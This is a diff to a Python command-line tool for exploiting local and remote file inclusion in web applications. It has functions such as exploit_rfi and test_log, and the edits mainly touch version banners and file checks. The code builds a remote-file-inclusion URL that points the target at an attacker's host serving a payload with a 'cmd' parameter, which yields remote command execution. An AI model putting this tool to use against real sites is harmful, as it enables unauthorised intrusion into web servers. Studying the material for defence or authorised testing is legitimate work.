@@ -33,7 +33,7 @@ color3 = '\033[38;2;180;180;180m'
 reset = '\033[0m'
 
 print(Fore.LIGHTGREEN_EX + logo)
-print(f'{color1}by{reset} {color2}c0ld{reset}{color3}t3ars{reset}')
+print(f'{color1}by{reset} {color2}c0ld{reset}{color3}t3ars{reset} | Version 1.2 Stable')
 
 def detect_query(url):
     match = re.search(r'\?([^#]+)', url)
@@ -92,8 +92,9 @@ def exploit_rfi(url, param, rhost, rport, cookies, args):
     shell_url = f"http://{rhost}:{rport}/{payload_file}&cmd={args.exec}"
 
     try:
-        if '=' not in param:
-            return False
+        if args.rfi and not os.path.isfile(args.lfile):
+            print(f"{Fore.RED}[!] RFI mode: file '{args.lfile}' does not exist.{Style.RESET_ALL}")
+            return        
         base_param = param.split('=')[0]
         rfi_url = url.replace(param, f"{base_param}={shell_url}")
 
@@ -163,7 +164,6 @@ def test_log(url, param, word, cookies, cmd, payloads):
 
 def main():
     parser = argparse.ArgumentParser()
-    print('Version 1.2 | Stable')
     parser.add_argument('-u', '--url', required=True)
     parser.add_argument('-w', '--wordlist', default='src/wordlist.txt')
     parser.add_argument('--cookie', help='cookies for search')
@@ -183,12 +183,9 @@ def main():
     print(f"{Fore.WHITE}[INFO] Wordlist: {args.wordlist}{Style.RESET_ALL}")
     print(f"{Fore.WHITE}[INFO] Payloads: {args.payloads}{Style.RESET_ALL}")
 
-    if not os.path.isfile(args.lfile):
-        print(f"{Fore.RED}[!] File '{args.lfile}' does not exist.{Style.RESET_ALL}")
+    if args.rfi and not os.path.isfile(args.lfile):
+        print(f"{Fore.RED}[!] RFI mode: file '{args.lfile}' does not exist.{Style.RESET_ALL}")
         return
-
-    print(f"{Fore.WHITE}[INFO] Starting local HTTP server on port {args.lport}{Style.RESET_ALL}")
-    start_local_server(args.lport, args)
 
     params = detect_query(args.url)
     if not params:
